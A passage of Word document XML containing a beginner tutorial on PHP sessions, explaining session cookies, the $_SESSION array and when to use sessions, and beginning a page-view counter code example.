          <w:ins w:id="169" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="170" w:author="Unknown">
        <w:r w:rsidRPr="00FA6CF1">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t xml:space="preserve">Whenever a session is created, a cookie containing the unique session id is stored on the user’s computer and returned with every request to the server.  If the client browser does not support cookies, the unique </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00FA6CF1">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>php</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00FA6CF1">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t xml:space="preserve"> session id is displayed in the URL</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00FA6CF1" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="171" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="172" w:author="Unknown">
        <w:r w:rsidRPr="00FA6CF1">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>Sessions have the capacity to store relatively large data compared to cookies.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00FA6CF1" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="173" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="174" w:author="Unknown">
        <w:r w:rsidRPr="00FA6CF1">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>The session values are automatically deleted when the browser is closed. If you want to store the values permanently, then you should store them in the database.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00DE4B47" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="86"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="175" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="176" w:author="Unknown">
        <w:r w:rsidRPr="00DE4B47">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Just like the $_COOKIE array variable, session variables are stored in the $_SESSION array variable. Just like cookies, the session must be started before any HTML tags.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="177" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="178" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Why and when to use Sessions?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="007000E9" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="179" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="180" w:author="Unknown">
        <w:r w:rsidRPr="007000E9">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>You want to store important information such as the user id more securely on the server where malicious users cannot temper with them.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="007000E9" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="181" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="182" w:author="Unknown">
        <w:r w:rsidRPr="007000E9">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>You want to pass values from one page to another.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="007000E9" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="183" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="184" w:author="Unknown">
        <w:r w:rsidRPr="007000E9">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>You want the alternative to cookies on browsers that do not support cookies.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="007000E9" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="185" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="186" w:author="Unknown">
        <w:r w:rsidRPr="007000E9">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>You want to store global variables in an efficient and more secure way compared to passing them in the URL</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="87"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="187" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="188" w:author="Unknown">
        <w:r w:rsidRPr="007000E9">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>You are developing an application such as a shopping cart that has to temporary store information with a capacity larger than 4KB.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="189" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="190" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Creating a Session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="191" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="192" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">In order </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>to  create</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> a session, you must first call the PHP </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>session_start</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> function and then store your values in the $_SESSION array variable.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="193" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="194" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Let’s suppose we want to know the number of times that a page has been loaded, we can use a session to do that.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="195" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="196" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>The code below shows how to create and retrieve values from sessions</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="197" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="198"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199"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00" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="201" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>session_</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>start</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">); //start the </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>PHP_session</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve"> function </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="202"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03" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="204" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>if(</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>isset</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>($_SESSION['</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>page_count</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>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05" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="206" w:author="Unknown">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07" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="208" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">     $_</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>SESSION[</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>'</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>page_count</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>'] += 1;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="209" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="210" w:author="Unknown">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11" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="212" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>else</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="213" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="214" w:author="Unknown">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15" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="216" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">     $_</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>SESSION[</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>'</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>page_count</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>'] = 1;</w:t>
        </w:r>
      </w:ins>
    </w:p>
